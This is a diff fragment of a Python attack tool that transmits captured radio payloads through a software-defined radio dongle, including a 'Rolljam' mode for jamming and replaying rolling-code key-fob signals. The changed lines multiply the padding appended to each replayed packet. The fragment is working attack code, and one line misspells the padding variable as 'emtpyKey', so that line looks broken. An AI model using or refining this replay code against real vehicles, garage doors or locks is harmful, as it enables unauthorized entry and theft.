@@ -128,14 +128,14 @@ def main():
             input("[ENTER TO SEND PAYLOAD]")
         print("[*] Rolljam enabled, so only sending first capture..\n")
         d.makePktFLEN(len(payloads[0]))
-        d.RFxmit(payloads[0] + emtpyKey)
+        d.RFxmit(payloads[0] + emtpyKey * number)
         print("[PACKET SENT] Payload transmittion completed..\n")
 
         input("[ENTER TO SEND OTHER PAYLOAD]")
         for x in range(1, len(payloads)):
             d.makePktFLEN(len(payloads[x]))
             #time.sleep(.5)
-            d.RFxmit(payloads[x] + emptyKey)
+            d.RFxmit(payloads[x] + emptyKey * number)
             print("[PACKET SENT] Payload transmittion completed..\n")
     else:
         if not auto:
@@ -144,7 +144,7 @@ def main():
         for x in range(0, len(signals)):
             d.makePktFLEN(len(payloads[x]))
             #time.sleep(.5)
-            d.RFxmit(payloads[x] + emptyKey)
+            d.RFxmit(payloads[x] + emptyKey * number)
             print("[PACKET SENT] Payload transmittion completed..\n")
 
     print("[*] All captures were sent successfully..")
